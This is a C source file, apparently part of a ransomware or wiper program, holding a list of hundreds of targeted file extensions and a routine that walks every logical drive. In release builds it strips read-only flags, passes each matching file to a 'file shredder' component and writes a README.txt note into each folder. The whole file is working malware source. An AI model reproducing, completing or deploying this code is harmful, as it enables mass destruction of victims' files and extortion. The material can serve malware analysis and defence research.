/*
* MIT License
*
* Copyright (c) 2022 kadzicu
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#include "SearchEngineClass.h"

_TCHAR* arrayOfFileExtensions[] =
{
    _T("001"),      _T("1cd"),      _T("3d"),      _T("3d4"),   _T("3df8"),  _T("3dm"),      _T("3ds"),        _T("3fr"),      _T("3g2"),  _T("3gp"),
    _T("3gp2"),     _T("3mm"),      _T("3pr"),     _T("7z"),    _T("8ba"),   _T("8bc"),      _T("8be"),        _T("8bf"),      _T("8bi8"), _T("8bl"),
    _T("8bs"),      _T("8bx"),      _T("8by"),     _T("8li"),   _T("aac"),   _T("aaf"),      _T("ab4"),        _T("abk"),      _T("abw"),  _T("ac3"),
    _T("accdb"),    _T("accde"),    _T("accdr"),   _T("accdt"), _T("ace"),   _T("ach"),      _T("acr"),        _T("act"),      _T("adb"),  _T("ade"),
    _T("adi"),      _T("adpb"),     _T("adr"),     _T("ads"),   _T("adt"),   _T("aep"),      _T("aepx"),       _T("aet"),      _T("agdl"), _T("ai"),
    _T("aif"),      _T("aim"),      _T("aip"),     _T("ais"),   _T("ait"),   _T("al"),       _T("amr"),        _T("amu"),      _T("amx"),  _T("amxx"),
    _T("ans"),      _T("ap"),       _T("ape"),     _T("api"),   _T("apj"),   _T("arc"),      _T("ari"),        _T("arj"),      _T("aro"),  _T("arr"),
    _T("arw"),      _T("as"),       _T("as3"),     _T("asa"),   _T("asc"),   _T("ascx"),     _T("ase"),        _T("asf"),      _T("ashx"), _T("asm"),
    _T("asmx"),     _T("asp"),      _T("aspx"),    _T("asr"),   _T("asx"),   _T("avi"),      _T("avs"),        _T("awg"),      _T("back"), _T("backup"),
    _T("backupdb"), _T("bak"),      _T("bank"),    _T("bay"),   _T("bdb"),   _T("bdp"),      _T("bdr"),        _T("bgt"),      _T("bi8"),  _T("bib"),
    _T("bic"),      _T("big"),      _T("bik"),     _T("bkf"),   _T("bkp"),   _T("blend"),    _T("blp"),        _T("bmc"),      _T("bmf"),  _T("bml"),
    _T("bmp"),      _T("bp2"),      _T("bp3"),     _T("bpl"),   _T("bpw"),   _T("bsp"),      _T("bz2"),        _T("c"),        _T("cab"),  _T("cag"),
    _T("cam"),      _T("cap"),      _T("car"),     _T("cbr"),   _T("cbz"),   _T("cc"),       _T("ccd"),        _T("cch"),      _T("cd"),   _T("cdf"),
    _T("cdr"),      _T("cdr3"),     _T("cdr4"),    _T("cdr5"),  _T("cdr6"),  _T("cdrw"),     _T("cdx"),        _T("ce1"),      _T("ce2"),  _T("cer"),
    _T("cfg"),      _T("cgm"),      _T("chk"),     _T("cib"),   _T("class"), _T("clr"),      _T("cls"),        _T("cms"),      _T("cmt"),  _T("cod"),
    _T("col"),      _T("contact"),  _T("core"),    _T("cp"),    _T("cpi"),   _T("cpp"),      _T("cr2"),        _T("craw"),     _T("crd"),  _T("crproj"),
    _T("crt"),      _T("crw"),      _T("cs"),      _T("csh"),   _T("csi"),   _T("csl"),      _T("cso"),        _T("csv"),      _T("ctt"),  _T("cty"),
    _T("cwf"),      _T("dac"),      _T("dal"),     _T("dap"),   _T("dat"),   _T("db"),       _T("db-journal"), _T("db3"),      _T("dbb"),  _T("dbf"),
    _T("dbx"),      _T("dc2"),      _T("dcp"),     _T("dcr"),   _T("dcs"),   _T("dcu"),      _T("ddc"),        _T("ddcx"),     _T("ddd"),  _T("ddoc"),
    _T("ddrw"),     _T("dds"),      _T("dem"),     _T("der"),   _T("des"),   _T("design"),   _T("dev"),        _T("dex"),      _T("dgc"),  _T("dic"),
    _T("dif"),      _T("dii"),      _T("dir"),     _T("disk"),  _T("divx"),  _T("diz"),      _T("djvu"),       _T("dmg"),      _T("dng"),  _T("dob"),
    _T("doc"),      _T("docb"),     _T("docm"),    _T("docx"),  _T("dot"),   _T("dotm"),     _T("dotx"),       _T("dox"),      _T("dpk"),  _T("dpl"),
    _T("dpr"),      _T("drf"),      _T("drw"),     _T("dsk"),   _T("dsp"),   _T("dtd"),      _T("dvd"),        _T("dvi"),      _T("dvx"),  _T("dwg"),
    _T("dxb"),      _T("dxe"),      _T("dxf"),     _T("dxg"),   _T("efx"),   _T("elf"),      _T("eml"),        _T("eps"),      _T("eql"),  _T("erbsql"),
    _T("erf"),      _T("err"),      _T("etx"),     _T("euc"),   _T("evo"),   _T("ex"),       _T("exf"),        _T("f3d"),      _T("f90"),  _T("faq"),
    _T("fcd"),      _T("fdb"),      _T("fdr"),     _T("fds"),   _T("ff"),    _T("ffd"),      _T("fff"),        _T("fh"),       _T("fhd"),  _T("fiv"),
    _T("fla"),      _T("flac"),     _T("flp"),     _T("flv"),   _T("for"),   _T("fpp"),      _T("fpx"),        _T("fxg"),      _T("gam"),  _T("gif"),
    _T("gray"),     _T("grey"),     _T("grf"),     _T("gry"),   _T("gthr"),  _T("gz"),       _T("gzig"),       _T("gzip"),     _T("h"),    _T("h3m"),
    _T("h4r"),      _T("hbk"),      _T("hpp"),     _T("htm"),   _T("html"),  _T("ibank"),    _T("ibd"),        _T("ibz"),      _T("ico"),  _T("idml"),
    _T("idx"),      _T("iff"),      _T("iif"),     _T("iiq"),   _T("img"),   _T("incpas"),   _T("indb"),       _T("indd"),     _T("indl"), _T("indt"),
    _T("ink"),      _T("inx"),      _T("ipa"),     _T("iso"),   _T("isu"),   _T("isz"),      _T("itdb"),       _T("itl"),      _T("iwd"),  _T("jar"),
    _T("jav"),      _T("java"),     _T("jc"),      _T("jgz"),   _T("jif"),   _T("jiff"),     _T("jpc"),        _T("jpe"),      _T("jpeg"), _T("jpf"),
    _T("jpg"),      _T("jpw"),      _T("js"),      _T("kc2"),   _T("kdbx"),  _T("kdc"),      _T("key"),        _T("kmz"),      _T("kpdx"), _T("kwd"),
    _T("lbi"),      _T("lcd"),      _T("lcf"),     _T("ldb"),   _T("lgp"),   _T("lnk"),      _T("lp2"),        _T("ltm"),      _T("ltr"),  _T("lua"),
    _T("lvl"),      _T("lzh"),      _T("m"),       _T("m3u"),   _T("m3u8"),  _T("m4u"),      _T("m4v"),        _T("mag"),      _T("man"),  _T("map"),
    _T("max"),      _T("mbox"),     _T("mbx"),     _T("mcd"),   _T("md0"),   _T("md1"),      _T("md2"),        _T("md3"),      _T("mdb"),  _T("mdc"),
    _T("mdf"),      _T("mdl"),      _T("mdn"),     _T("mds"),   _T("mef"),   _T("mfw"),      _T("mic"),        _T("mid"),      _T("mip"),  _T("mkv"),
    _T("mlx"),      _T("mm6"),      _T("mm7"),     _T("mm8"),   _T("mmw"),   _T("mod"),      _T("moneywell"),  _T("mos"),      _T("mov"),  _T("moz"),
    _T("mp3"),      _T("mp4"),      _T("mpa"),     _T("mpeg"),  _T("mpg"),   _T("mrw"),      _T("msg"),        _T("msp"),      _T("mxp"),  _T("myd"),
    _T("nav"),      _T("ncd"),      _T("nd"),      _T("ndd"),   _T("nds"),   _T("nef"),      _T("nfo"),        _T("nk2"),      _T("nop"),  _T("now"),
    _T("nrg"),      _T("nri"),      _T("nrw"),     _T("ns2"),   _T("ns3"),   _T("ns4"),      _T("nsd"),        _T("nsf"),      _T("nsg"),  _T("nsh"),
    _T("nwb"),      _T("nx1"),      _T("nx2"),     _T("nyf"),   _T("oab"),   _T("obj"),      _T("odb"),        _T("odc"),      _T("odf"),  _T("odg"),
    _T("odi"),      _T("odm"),      _T("odp"),     _T("ods"),   _T("odt"),   _T("oft"),      _T("oga"),        _T("ogg"),      _T("oil"),  _T("opf"),
    _T("orf"),      _T("ost"),      _T("otg"),     _T("oth"),   _T("otp"),   _T("ots"),      _T("ott"),        _T("owl"),      _T("oxt"),  _T("p12"),
    _T("p7b"),      _T("p7c"),      _T("pab"),     _T("pages"), _T("pak"),   _T("pas"),      _T("pat"),        _T("pbf"),      _T("pbp"),  _T("pbs"),
    _T("pcd"),      _T("pct"),      _T("pcv"),     _T("pdb"),   _T("pdd"),   _T("pdf"),      _T("pef"),        _T("pem"),      _T("pfx"),  _T("php"),
    _T("pkb"),      _T("pkh"),      _T("pl"),      _T("plb"),   _T("plc"),   _T("pli"),      _T("pm"),         _T("pmd"),      _T("png"),  _T("pot"),
    _T("potm"),     _T("potx"),     _T("ppam"),    _T("ppd"),   _T("ppf"),   _T("ppj"),      _T("pps"),        _T("ppsm"),     _T("ppsx"), _T("ppt"),
    _T("pptm"),     _T("pptx"),     _T("prc"),     _T("prel"),  _T("prf"),   _T("prproj"),   _T("prt"),        _T("ps"),       _T("psa"),  _T("psafe3"),
    _T("psd"),      _T("pspimage"), _T("pst"),     _T("ptx"),   _T("puz"),   _T("pwf"),      _T("pwi"),        _T("pxp"),      _T("py"),   _T("qba"),
    _T("qbb"),      _T("qbm"),      _T("qbr"),     _T("qbw"),   _T("qbx"),   _T("qby"),      _T("qdf"),        _T("qel"),      _T("qif"),  _T("qpx"),
    _T("qtq"),      _T("qtr"),      _T("r00"),     _T("r01"),   _T("r02"),   _T("r03"),      _T("r3d"),        _T("ra"),       _T("raf"),  _T("rar"),
    _T("rat"),      _T("raw"),      _T("rb"),      _T("rdb"),   _T("res"),   _T("rev"),      _T("rgn"),        _T("rm"),       _T("rng"),  _T("rrt"),
    _T("rsrc"),     _T("rsw"),      _T("rte"),     _T("rtf"),   _T("rts"),   _T("rum"),      _T("run"),        _T("rv"),       _T("rw1"),  _T("rw2"),
    _T("rwl"),      _T("rwz"),      _T("s3db"),    _T("sad"),   _T("saf"),   _T("sas7bdat"), _T("sav"),        _T("say"),      _T("scm"),  _T("scn"),
    _T("scx"),      _T("sd0"),      _T("sda"),     _T("sdb"),   _T("sdc"),   _T("sdf"),      _T("sdn"),        _T("sds"),      _T("sdt"),  _T("sen"),
    _T("settings"), _T("sfs"),      _T("sfx"),     _T("sh"),    _T("shar"),  _T("shr"),      _T("shw"),        _T("sldm"),     _T("sldx"), _T("sln"),
    _T("slt"),      _T("snp"),      _T("so"),      _T("spr"),   _T("sql"),   _T("sqlite"),   _T("sqlite3"),    _T("sqlitedb"), _T("sqx"),  _T("sr2"),
    _T("srf"),      _T("srt"),      _T("srw"),     _T("ssa"),   _T("st4"),   _T("st5"),      _T("st6"),        _T("st7"),      _T("st8"),  _T("stc"),
    _T("std"),      _T("sti"),      _T("stt"),     _T("stw"),   _T("stx"),   _T("sud"),      _T("svg"),        _T("svi"),      _T("svr"),  _T("swd"),
    _T("swf"),      _T("sxc"),      _T("sxd"),     _T("sxg"),   _T("sxi"),   _T("sxm"),      _T("sxw"),        _T("t01"),      _T("t03"),  _T("t05"),
    _T("tar"),      _T("tax2013"),  _T("tax2014"), _T("tbz2"),  _T("tch"),   _T("tcx"),      _T("tex"),        _T("text"),     _T("tg"),   _T("tga"),
    _T("thm"),      _T("thmx"),     _T("tif"),     _T("tlg"),   _T("tlz"),   _T("torrent"),  _T("tpu"),        _T("tpx"),      _T("trp"),  _T("tu"),
    _T("tur"),      _T("txd"),      _T("txf"),     _T("txt"),   _T("uax"),   _T("udf"),      _T("umx"),        _T("unr"),      _T("unx"),  _T("uop"),
    _T("upoi"),     _T("url"),      _T("usa"),     _T("usx"),   _T("ut2"),   _T("ut3"),      _T("utc"),        _T("utx"),      _T("uue"),  _T("uvx"),
    _T("uxx"),      _T("vb"),       _T("vc"),      _T("vcd"),   _T("vcf"),   _T("vdo"),      _T("ver"),        _T("vhd"),      _T("vmf"),  _T("vmt"),
    _T("vob"),      _T("vsi"),      _T("vtf"),     _T("w3g"),   _T("w3x"),   _T("wad"),      _T("wallet"),     _T("war"),      _T("wav"),  _T("wave"),
    _T("wb2"),      _T("wbk"),      _T("wdgt"),    _T("wks"),   _T("wm"),    _T("wma"),      _T("wmd"),        _T("wmdb"),     _T("wmmp"), _T("wmv"),
    _T("wmx"),      _T("wow"),      _T("wpd"),     _T("wpk"),   _T("wpl"),   _T("wps"),      _T("wsh"),        _T("wtd"),      _T("wtf"),  _T("wvx"),
    _T("x11"),      _T("x3f"),      _T("xis"),     _T("xl"),    _T("xla"),   _T("xlam"),     _T("xlc"),        _T("xlk"),      _T("xll"),  _T("xlm"),
    _T("xlr"),      _T("xls"),      _T("xlsb"),    _T("xlsm"),  _T("xlsx"),  _T("xlt"),      _T("xltm"),       _T("xltx"),     _T("xlv"),  _T("xlw"),
    _T("xlwx"),     _T("xml"),      _T("xpi"),     _T("xpt"),   _T("xqx"),   _T("xvid"),     _T("xwd"),        _T("xz"),       _T("yab"),  _T("ycbcr"),
    _T("yps"),      _T("yuv"),      _T("z"),       _T("z02"),   _T("z04"),   _T("zap"),      _T("zip"),        _T("zipx"),     _T("zoo")
};

search_engine_class_t* search_engine_class_create()
{
    search_engine_class_t* search_engine_class_obj = (search_engine_class_t*)malloc(sizeof(search_engine_class_t));
    if (search_engine_class_obj)
    {
        search_engine_class_obj->impl_ = malloc(sizeof(search_engine_class_variables_t));
        if (search_engine_class_obj->impl_)
        {
            search_engine_class_obj->method = (search_engine_class_methods_t*)malloc(sizeof(search_engine_class_methods_t));
            if (search_engine_class_obj->method)
            {
                search_engine_class_t* res = search_engine_class_init(search_engine_class_obj);
                if (res)
                    return res;
                else
                {
                    free(search_engine_class_obj->method);
                    free(search_engine_class_obj->impl_);
                    free(search_engine_class_obj);
                    return NULL;
                }
            }
            else
            {
                free(search_engine_class_obj->impl_);
                free(search_engine_class_obj);
                return NULL;
            }
        }
        else
        {
            free(search_engine_class_obj);
            return NULL;
        }
    }
    else
        return NULL;
}

static search_engine_class_t* search_engine_class_init(search_engine_class_t* this)
{
    this->method->se_destroy = se_destroy;
    this->method->se_start = se_start;

    search_engine_class_variables_t* var = (search_engine_class_variables_t*)this->impl_;
    var->arrayOfFileExtensions = arrayOfFileExtensions;
    var->fileExtensionArraySize = _countof(arrayOfFileExtensions);

    qsort(var->arrayOfFileExtensions, var->fileExtensionArraySize, sizeof(_TCHAR*), se_compare);

    return this;
}

static void search_engine_class_destroy(search_engine_class_t* this) 
{
    if (this)
    {
        if (this->impl_)
            free(this->impl_);
        if (this->method)
            free(this->method);
        free(this);
    }
}

static void search_engine_class_start(
        search_engine_class_t* this,
        LPCTSTR currentLogicalDrive
    )
{
    _TCHAR currentPath[MAX_PATH + 0x01];
    _tcscpy_s(currentPath, _countof(currentPath), currentLogicalDrive);
    _tcscat_s(currentPath, _countof(currentPath), _T("\\"));

    _TCHAR findParam[MAX_PATH + 0x01];
    _tcscpy_s(findParam, _countof(findParam), currentPath);
    _tcscat_s(findParam, _countof(findParam), _T("*"));

    HANDLE hFind;
    WIN32_FIND_DATA findData;

    search_engine_class_variables_t* var = (search_engine_class_variables_t*)this->impl_;

    if ((hFind = FindFirstFile(findParam, &findData)) != INVALID_HANDLE_VALUE)
    {
        do
        {
            if (!lstrcmp(findData.cFileName, _T(".")) ||
                !lstrcmp(findData.cFileName, _T("..")) ||
                findData.cFileName[0x00] == _T('.'))
                continue;

            _TCHAR currentFile[MAX_PATH + 0x01];
            _tcscpy_s(currentFile, _countof(currentFile), currentPath);
            _tcscat_s(currentFile, _countof(currentFile), findData.cFileName);

            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN) &&
                !(findData.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) &&
                !(findData.dwFileAttributes & FILE_ATTRIBUTE_TEMPORARY) &&
                !(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
            {
                _TCHAR* currentFileExt = PathFindExtension(
                    currentFile
                ) + 0x01;

                if (bsearch(&currentFileExt, var->arrayOfFileExtensions, var->fileExtensionArraySize, sizeof(_TCHAR*), se_compare))
                {
#ifndef _DEBUG
                    if (findData.dwFileAttributes & FILE_ATTRIBUTE_READONLY)
                        SetFileAttributes(currentFile, FILE_ATTRIBUTE_NORMAL);

                    file_shredder_class_t* file_shredder_class_obj = file_shredder_class_create(currentFile);
                    if (file_shredder_class_obj)
                    {
                        file_shredder_class_obj->method->fs_start(file_shredder_class_obj);
                        file_shredder_class_obj->method->fs_destroy(file_shredder_class_obj);
                    }
#else
                    _tprintf(_T("%s\n"), currentFile);
#endif
                }
            }

            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY &&
                !(findData.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) &&
                !(findData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN)) 
            {
#ifndef _DEBUG
                _TCHAR README[MAX_PATH + 0x01];
                _tcscpy_s(README, _countof(README), currentFile);
                _tcscat_s(README, _countof(README), _T("\\README.txt"));

                message_class_t* message_class_obj = message_class_create(README);
                if (message_class_obj)
                {
                    message_class_obj->method->m_send(message_class_obj);
                    message_class_obj->method->m_destroy(message_class_obj);
                }
#endif
                search_engine_class_start(this, currentFile);
            }
        } while (FindNextFile(hFind, &findData));

        FindClose(hFind);
    }
}

static void se_destroy(search_engine_class_t* this)
{
    search_engine_class_destroy(this);
}

static void se_start(search_engine_class_t* this)
{
    logical_drive_class_t* logical_drive_class_obj = logical_drive_class_create();
    if (logical_drive_class_obj)
    {
        int number_of_logical_drives = logical_drive_class_obj->method->get_var_number_of_logical_drives(logical_drive_class_obj);
        _TCHAR** list_of_logical_drives = logical_drive_class_obj->method->get_var_list_of_logical_drives(logical_drive_class_obj);

        for (size_t i = 0; i < number_of_logical_drives; i++)
            search_engine_class_start(this, list_of_logical_drives[i]);

        logical_drive_class_obj->method->ld_destroy(logical_drive_class_obj);
    }
}

static int se_compare(LPCVOID arg1, LPCVOID arg2)
{
    return _tcsicmp(
        *(_TCHAR**)arg1,
        *(_TCHAR**)arg2
    );
}